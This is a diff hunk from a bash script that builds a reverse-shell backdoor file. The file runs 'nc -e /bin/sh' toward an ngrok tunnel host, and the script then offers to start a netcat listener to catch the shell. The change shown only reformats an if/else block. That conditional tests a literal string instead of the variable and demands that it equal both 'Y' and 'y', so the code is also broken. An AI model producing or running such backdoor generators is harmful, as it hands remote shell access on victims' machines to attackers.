@@ -36,12 +36,12 @@ read -p 'Port_for_listener: ' pg
 read -p 'Directory to save: ' dir
 echo nc -e /bin/sh 0.tcp.ngrok.io $ng  > $dir#back".sh"
 read -p 'Do you want to start listener?Y/n: ' ser
-    if [[ (ser=="Y") && (ser=="y") ]]; then
+    if [[ ( ser == "Y" ) && ( ser == "y" ) ]]; then
  echo "Starting server:"$host2"_with_port:" $pg
  nc -lvp $pg
- else
- echo "Ok,goodbye..."
- exit
+    else
+    echo "Ok,goodbye..."
+    exit
     fi
    fi
 fi
